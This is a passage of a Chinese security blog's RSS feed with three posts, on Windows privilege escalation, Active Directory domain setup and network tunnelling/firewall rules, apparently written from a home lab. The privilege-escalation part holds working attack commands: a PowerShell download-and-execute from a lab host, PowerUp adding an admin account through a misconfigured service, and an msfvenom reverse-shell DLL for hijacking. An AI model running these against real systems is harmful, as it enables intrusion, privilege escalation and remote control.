&lt;pre&gt;&lt;code&gt;powershell -ep bypass -c &amp;quot;. .\PrivescCheck.ps1; Invoke-PrivescCheck&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;远程使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;powershell -nop -exec bypass -c &amp;quot;IEX (New-Object 
Net.WebClient).DownloadString(&#39;http://192.168.27.11/PrivescCheck.ps1&#39;); Invoke-PrivescCheck&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;PowerUp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;导入并执行脚本 powershell.exe -exec bypass -command “&amp;amp;{Import-Module .\PowerUp.ps1;Invoke-AllChecks}”&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111173012800.png&#34; alt=&#34;image-20231111173012800&#34;&gt;&lt;/p&gt;
&lt;p&gt;StartName    : LocalSystem&lt;/p&gt;
&lt;p&gt;AbuseFunction  : Install-ServiceBinary -ServiceName ‘MongoDB’&lt;/p&gt;
&lt;p&gt;利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当可直接添加管理员用户&lt;/p&gt;
&lt;p&gt;添加管理员&lt;/p&gt;
&lt;p&gt;powershell.exe -exec bypass -command “&amp;amp;{Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName ‘MongoDB’ -UserName yunyi4 -Password admin}”&lt;/p&gt;
&lt;p&gt;服务被重启或者计算机重启后就可以添加成功了&lt;/p&gt;
&lt;h4 id=&#34;不带引号的服务路径&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#不带引号的服务路径&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;不带引号的服务路径&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。&lt;/p&gt;
&lt;p&gt;使用命令查看服务器存在空格，路径可写 即存在漏洞&lt;/p&gt;
&lt;p&gt;wmic service get name,displayname,pathname,startmode |findstr /i “Auto” |findstr /i /v “C:\Windows\” |findstr /i /v “”&amp;quot;&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
&lt;p&gt;C:\Program Files&lt;br&gt;
(x86)\2345Soft\2345Pic\protect\Pic_2345Svc.exe    Auto&lt;/p&gt;
&lt;p&gt;这种存在空格&lt;/p&gt;
&lt;p&gt;msf 生成一个 program.exe 放在 c 应用重启即可上线&lt;/p&gt;
&lt;h3 id=&#34;dll劫持提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dll劫持提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;DLL 劫持提权&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;查看应用进程找数字签名或者未知文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191157012.png&#34; alt=&#34;image-20231111191157012&#34;&gt;&lt;/p&gt;
&lt;p&gt;生成一个名字一样的 dll 并且替换&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=6789 -f dll &amp;gt; /root/2345MgrDLL.dll&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191517160.png&#34; alt=&#34;image-20231111191517160&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191909318.png&#34; alt=&#34;image-20231111191909318&#34;&gt;&lt;/p&gt;
&lt;p&gt;msf 上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111192614857.png&#34; alt=&#34;image-20231111192614857&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/%E5%9F%9F%E7%8E%AF%E5%A2%83/</guid>
            <title>域环境</title>
            <link>http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/%E5%9F%9F%E7%8E%AF%E5%A2%83/</link>
            <pubDate>Mon, 30 Oct 2023 12:00:34 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;域&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域&#34;&gt;#&lt;/a&gt; 域&lt;/h3&gt;
&lt;p&gt;在计算机网络中，&lt;strong&gt;域环境&lt;/strong&gt;是一种组织资源和用户的方式，它允许集中管理和控制网络中的各种对象。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;域（Domain）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;域是一个逻辑上分组的计算机、用户和设备集合，它们共享一个安全边界和一组共同的策略。&lt;/li&gt;
&lt;li&gt;域的边界通常由网络协议、安全策略和域控制器来定义。&lt;/li&gt;
&lt;li&gt;域提供了集中式的管理和认证，使得网络资源的访问和管理更加方便和安全。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;域控制器（Domain Controller）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;域控制器是域环境中的核心组件，负责管理域中的安全认证和授权、用户账户和计算机账户的管理。&lt;/li&gt;
&lt;li&gt;它运行特定的服务，如活动目录服务（Active Directory Service）。&lt;/li&gt;
&lt;li&gt;域控制器保存了域中的用户、组、计算机等对象的信息，并提供身份验证和授权服务。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;活动目录（Active Directory）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;活动目录是一种目录服务，用于在网络环境中存储、组织和提供对网络资源的访问。&lt;/li&gt;
&lt;li&gt;它包含了域内所有对象的信息，如用户、组、计算机等，并提供了一种层次结构来组织这些对象。&lt;/li&gt;
&lt;li&gt;活动目录允许管理员通过分配权限和策略来控制用户对资源的访问和使用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;集中式身份验证和授权&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;活动目录允许用户通过单一的登录认证来访问网络上的各种资源，无论是文件共享、打印机、电子邮件等。&lt;/li&gt;
&lt;li&gt;用户登录后，活动目录负责验证其身份，并根据其权限授予对资源的访问权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;集中式资源管理&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;活动目录可以存储和管理网络中的各种资源，包括用户账户、计算机账户、组、文件共享、打印机等。&lt;/li&gt;
&lt;li&gt;管理员可以使用活动目录管理工具对这些资源进行组织、分配权限、设置策略等操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;层次结构组织&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;活动目录使用层次结构来组织网络资源和用户信息，这种层次结构称为目录树或者域树。&lt;/li&gt;
&lt;li&gt;目录树由各种对象组成，包括域、组织单位（OU）、容器、用户、计算机等，这些对象可以按照管理员的需求进行组织和管理。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;灵活的安全模型&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;活动目录提供了灵活的安全模型，可以根据组织的需求来设置不同级别的安全策略和权限控制。&lt;/li&gt;
&lt;li&gt;管理员可以通过活动目录设置用户访问权限、密码策略、帐户锁定策略、加密选项等，以确保网络安全。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;集中式管理工具&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;微软提供了各种管理工具，如 “活动目录用户和计算机”、“组策略管理编辑器” 等，用于管理和配置活动目录环境。&lt;/li&gt;
&lt;li&gt;这些工具提供了用户界面和命令行界面，可以用于执行各种管理任务，如创建用户、组织单位、设置组策略等。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;复制和同步&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;活动目录支持在多个域控制器之间进行复制和同步，以确保数据的一致性和可用性。&lt;/li&gt;
&lt;li&gt;当有新的数据或者更改发生时，活动目录会自动将这些变更复制到其他域控制器，以保持整个活动目录环境的同步。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;域成员（Domain Member）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;域成员是加入域的计算机或设备，它们受到域控制器的管理。&lt;/li&gt;
&lt;li&gt;加入域后，域成员可以通过活动目录中的账户进行身份验证，并且可以访问域中共享的资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;组策略（Group Policy）&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;组策略是一种管理工具，用于在域环境中配置和管理用户和计算机的操作系统和应用程序设置。&lt;/li&gt;
&lt;li&gt;管理员可以通过组策略向域中的用户和计算机分配特定的设置和权限，以实现统一的管理和安全策略。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;常见的域环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见的域环境&#34;&gt;#&lt;/a&gt; 常见的域环境&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;单域&lt;/strong&gt;：在一个地理位置固定的小公司中，建立一个域通常就可以满足需求。在一个域内，至少需要两台域服务器，一台作为&lt;strong&gt;域控制器&lt;/strong&gt;（Domain Controller，DC），另一台作为备份 DC。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;父域和子域&lt;/strong&gt;：出于管理和其他需求，需要在网络中划分多个域。第一个域称为&lt;strong&gt;父域&lt;/strong&gt;，各分部的域称为该域的&lt;strong&gt;子域&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;域树&lt;/strong&gt;：域树是多个域通过建立信任关系组成的集合。在域树内，父域和子域可以相互管理，并跨网络分配文件、打印机等设备和资源。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;域森林&lt;/strong&gt;：域森林是指多个域树通过建立信任关系的集合。域森林允许不同域之间实现资源共享、管理、通信和数据传输。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;活动目录&lt;/strong&gt;（Active Directory，AD）：活动目录是域环境中提供目录服务的组件。它是微软提供的统一管理基础的平台，用于集中管理账号、软件、环境和增强安全性。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;域内权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域内权限&#34;&gt;#&lt;/a&gt; 域内权限&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;安全组（Security Group）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安全组用于管理对资源的访问权限。&lt;/li&gt;
&lt;li&gt;可以将用户或计算机添加到安全组中，从而授予他们访问某些资源的权限。&lt;/li&gt;
&lt;li&gt;安全组的权限可以直接应用于文件夹、共享文件夹、打印机等资源，或者通过组策略应用于计算机。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;分发组（Distribution Group）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分发组用于向一组用户或计算机发送邮件。&lt;/li&gt;
&lt;li&gt;分发组通常用于群发邮件、通知、公告等目的，而不涉及访问资源的权限管理。&lt;/li&gt;
&lt;li&gt;分发组的成员可以收到组发的邮件，但不会获得访问资源的权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;域本地组（Domain Local Group）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;域本地组是一种在单个域内使用的组，用于管理对资源的访问权限。&lt;/li&gt;
&lt;li&gt;可以将用户、全局组或其他域本地组添加到域本地组中，并为该组分配访问资源的权限。&lt;/li&gt;
&lt;li&gt;域本地组的权限范围局限于单个域内，不会跨域生效。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;全局组（Global Group）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;全局组用于组织和管理用户和计算机。&lt;/li&gt;
&lt;li&gt;可以将用户添加到全局组中，然后将全局组添加到安全组或域本地组中，从而为他们分配访问资源的权限。&lt;/li&gt;
&lt;li&gt;全局组的权限范围跨越整个域，适用于跨域资源访问的权限管理。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;通用组（Universal Group）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通用组是一种特殊类型的组，可以跨域使用。&lt;/li&gt;
&lt;li&gt;可以将全局组、域本地组或其他通用组添加到通用组中，从而创建具有跨域权限的组。&lt;/li&gt;
&lt;li&gt;通用组通常用于复杂的跨域资源访问场景，如多域架构或跨域信任环境下的权限管理。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;域环境搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域环境搭建&#34;&gt;#&lt;/a&gt; 域环境搭建&lt;/h3&gt;
&lt;p&gt;winservser12-ad 10.10.10.137&lt;/p&gt;
&lt;p&gt;winserver12 10.10.10.12&lt;/p&gt;
&lt;p&gt;12ad 安装 Active Directory 域服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303161445246.png&#34; alt=&#34;image-20240303161445246&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162103134.png&#34; alt=&#34;image-20240303162103134&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击将此服务器提升为域控制器&lt;/p&gt;
&lt;p&gt;创建一个新林&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162255653.png&#34; alt=&#34;image-20240303162255653&#34;&gt;&lt;/p&gt;
&lt;p&gt;创建密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162407087.png&#34; alt=&#34;image-20240303162407087&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162608011.png&#34; alt=&#34;image-20240303162608011&#34;&gt;&lt;/p&gt;
&lt;p&gt;重启后显示 YUNYI 输入设置的密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163345745.png&#34; alt=&#34;image-20240303163345745&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163434498.png&#34; alt=&#34;image-20240303163434498&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163503532.png&#34; alt=&#34;image-20240303163503532&#34;&gt;&lt;/p&gt;
&lt;p&gt;创建成功，创建一个新用户 test12&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170230723.png&#34; alt=&#34;image-20240303170230723&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着把 12servser4 的 dns 设置成 ad 的 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170514382.png&#34; alt=&#34;image-20240303170514382&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置隶属于 yunyi.io 输入刚才创建的用户 test12 然后重启&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170622943.png&#34; alt=&#34;image-20240303170622943&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170725741.png&#34; alt=&#34;image-20240303170725741&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303171037565.png&#34; alt=&#34;image-20240303171037565&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303171338213.png&#34; alt=&#34;image-20240303171338213&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</guid>
            <title>隧道代理</title>
            <link>http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</link>
            <pubDate>Sat, 12 Nov 2022 17:10:18 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173022003.png&#34; alt=&#34;image-20240316173022003&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;代理技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理技术&#34;&gt;#&lt;/a&gt; 代理技术&lt;/h3&gt;
&lt;p&gt;代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端 “中间人” 的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。简单来说，代理技术解决的是网络之间的通信问题，如内网与外网之间或者两者自己之间的通信，两个不同内网的通信就必须借助到代理，否则无法通讯。&lt;/p&gt;
&lt;p&gt;图中两台内网中的主机是无法直接通信的，但是两台主机可以与公网的 vps 通信在公网 vps 上做代理转发把两台主机的流量转发给双方&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;建立连接&lt;/strong&gt;：首先，两台内网主机分别与公网 VPS 建立连接。这通常可以通过 SSH 或其他网络协议实现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;设置代理&lt;/strong&gt;：在公网 VPS 上设置代理服务器，用于接收来自两台内网主机的请求，并将请求转发给另一台主机。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据转发&lt;/strong&gt;：当一台内网主机发送数据时，数据首先被发送到公网 VPS，然后由 VPS 将数据转发给另一台内网主机。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315195904305.png&#34; alt=&#34;image-20240315195904305&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;隧道技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#隧道技术&#34;&gt;#&lt;/a&gt; 隧道技术&lt;/h3&gt;
&lt;p&gt;隧道技术是一种网络通信策略，它允许不同网络的设备通过互联网进行安全的交流。简单来说，隧道技术解决了在网络通信中遇到的阻碍问题，例如绕过防火墙的过滤、处理网络连接和通讯问题，以及处理数据回链封装问题。有时候，我们发送的数据流量可能会被拦截，这时就需要利用隧道技术来绕过这种阻碍。隧道技术通过采用不同的协议，将本来无法通行的通信路径打通。在进入内部网络后，有些协议可能会被拦截，导致我们无法接收到目标设备的流量。这时，可以借助一些特殊的协议来建立隧道，以重新实现通信。&lt;/p&gt;
&lt;p&gt;图中两台主机在同一个内网可以通信的，但是防火墙禁止了一些协议导致通过这些走的流量会被拦截导致无法通信，这时候就可以使用例如 icmp 等重新搭建一条路让流量走这里进行通信，但是不可以使用 http 因为 http 协议是基于 tcp 的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316164019233.png&#34; alt=&#34;image-20240316164019233&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316171226537.png&#34; alt=&#34;image-20240316171226537&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;协议出网判断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#协议出网判断&#34;&gt;#&lt;/a&gt; 协议出网判断&lt;/h4&gt;
&lt;p&gt;ICMP:ping 命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240422140551020.png&#34; alt=&#34;image-20240422140551020&#34;&gt;&lt;/p&gt;
&lt;p&gt;DNS 协议：nslookup&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240422140907905.png&#34; alt=&#34;image-20240422140907905&#34;&gt;&lt;/p&gt;
&lt;p&gt;SSH 隧道：ssh:root@192.168.0.123 22 端口&lt;/p&gt;
&lt;h4 id=&#34;关于正反shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#关于正反shell&#34;&gt;#&lt;/a&gt; 关于正反 shell&lt;/h4&gt;
&lt;p&gt;什么是正向 shell 反向 shell&lt;/p&gt;
&lt;p&gt;正向就是攻击机主动去连接绑定的受害机的端口&lt;/p&gt;
&lt;p&gt;反向就是让受害机主动来连接攻击机的指定端口&lt;/p&gt;
&lt;p&gt;一般来讲对于防火墙入站规则是比出站规则严格的多，端口过滤的会很严格除非有没有被过滤且没有被占用的端口，这时就可以使用反弹 shell 进行上线，如果防火墙禁止了 TCP 出站，那么就需要使用其他协议来搭建隧道。&lt;/p&gt;
&lt;h3 id=&#34;防火墙出入站规则&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙出入站规则&#34;&gt;#&lt;/a&gt; 防火墙出入站规则&lt;/h3&gt;
&lt;p&gt;防火墙上有出站和入站规则&lt;/p&gt;
&lt;p&gt;出站规则就是本机去访问外网&lt;/p&gt;
&lt;p&gt;例如一些软件需要去访问互联网上的资源&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203256799.png&#34; alt=&#34;image-20240315203256799&#34;&gt;&lt;/p&gt;
&lt;p&gt;入站就是比如当前主机是一台 web 服务器用户来访问服务器上的网站&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203441398.png&#34; alt=&#34;image-20240315203441398&#34;&gt;&lt;/p&gt;
&lt;p&gt;Windows 防火墙提供了三种网络配置文件：域、专用和公用&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;域&lt;/strong&gt;：当设备已加入 Active Directory 域，并且可以访问域控制器时，会自动应用域网络配置文件这种网络位置类型无法手动设置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;专用&lt;/strong&gt;：专用网络配置文件主要用于专用网络，如家庭网络或办公室网络管理员可以在网络接口上手动设置它&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;公用&lt;/strong&gt;：公用网络配置文件主要用于公共网络，如公共 Wi-Fi 网络或其他共享网络这是身份不明网络的默认配置文件&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203842956.png&#34; alt=&#34;image-20240315203842956&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203816409.png&#34; alt=&#34;image-20240315203816409&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;防火墙添加规则&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙添加规则&#34;&gt;#&lt;/a&gt; 防火墙添加规则&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315204831486.png&#34; alt=&#34;image-20240315204831486&#34;&gt;&lt;/p&gt;
&lt;p&gt;程序设置就是电脑里的一些软件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315213822274.png&#34; alt=&#34;image-20240315213822274&#34;&gt;&lt;/p&gt;
&lt;p&gt;指定的端口例如 80 端口 http，22ssh&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214021610.png&#34; alt=&#34;image-20240315214021610&#34;&gt;&lt;/p&gt;
&lt;p&gt;自定义可以设置的更详细些&lt;/p&gt;
&lt;p&gt;比如可以规定那些协议可以通过，应用于指定的 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214227534.png&#34; alt=&#34;image-20240315214227534&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214336145.png&#34; alt=&#34;image-20240315214336145&#34;&gt;&lt;/p&gt;
&lt;p&gt;当前主机有一个 web 服务 80 端口 http, 不想让别人访问到就可以设置入站规则&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214551009.png&#34; alt=&#34;image-20240315214551009&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214620069.png&#34; alt=&#34;image-20240315214620069&#34;&gt;&lt;/p&gt;
&lt;p&gt;规则开启时无法访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214721993.png&#34; alt=&#34;image-20240315214721993&#34;&gt;&lt;/p&gt;
&lt;p&gt;规则关闭时则正常访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214830260.png&#34; alt=&#34;image-20240315214830260&#34;&gt;&lt;/p&gt;
